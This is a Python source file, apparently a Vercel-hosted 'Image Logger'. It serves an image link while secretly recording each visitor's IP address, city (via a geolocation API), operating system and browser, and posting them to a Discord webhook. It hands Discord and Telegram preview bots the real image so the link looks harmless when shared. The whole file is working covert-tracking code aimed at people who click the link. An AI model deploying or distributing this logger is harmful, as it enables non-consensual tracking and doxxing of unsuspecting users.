from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, os

# --- CONFIGURATION ---
# To set your webhook, go to your Vercel Dashboard -> Settings -> Environment Variables
# Add a variable named: DISCORD_WEBHOOK
# Use the URL as the value.

config = {
    "webhook": os.getenv("DISCORD_WEBHOOK", ""), # Fetches from Environment Variables
    "image": "https://image.slidesharecdn.com/images/articles/2014/04/windows-xp-bliss-desktop-image-1000x7000.png.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Security Check: Image Loaded.",
        "richMessage": True,
    },
    "vpnCheck": 1, 
    "linkAlerts": True,
    "buggedImage": False, # Setting to False helps Discord embed the real image
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://google.com" 
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not ip or not useragent: return False
    if ip.startswith(("34", "35")): return "Discord"
    if "TelegramBot" in useragent: return "Telegram"
    return False

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not config["webhook"]: return
    if ip.startswith(blacklistedIPs): return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{
                    "title": "Link Sent",
                    "color": config["color"],
                    "description": f"Link detected by: `{bot}`\nEndpoint: `{endpoint}`"
                }]
            })
        return

    os_info, browser = httpagentparser.simple_detect(useragent)
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    # Simple report structure
    embed = {
        "username": config["username"],
        "embeds": [{
            "title": "IP Logged",
            "color": config["color"],
            "description": f"**IP:** `{ip}`\n**City:** `{info.get('city', 'Unknown')}`\n**OS:** `{os_info}`\n**Browser:** `{browser}`"
        }]
    }
    requests.post(config["webhook"], json=embed)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        
        # Determine Image URL
        url = config["image"]
        if config["imageArgument"] and dic.get("url"):
            try:
                url = base64.b64decode(dic.get("url")).decode()
            except: pass

        # Get Visitor IP
        ip = self.headers.get('x-forwarded-for', self.client_address[0])

        # If it's a Bot (Discord/Telegram), give it the image so it embeds
        if botCheck(ip, self.headers.get('user-agent')):
            self.send_response(302)
            self.send_header('Location', url)
            self.end_headers()
            makeReport(ip, endpoint=s, url=url)
            return

        # If it's a real user
        makeReport(ip, self.headers.get('user-agent'), endpoint=s, url=url)
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Simple HTML wrapper to show the image to the user
        content = f"<html><body style='margin:0;display:grid;place-items:center;'><img src='{url}' style='max-width:100%;'></body></html>"
        self.wfile.write(content.encode())
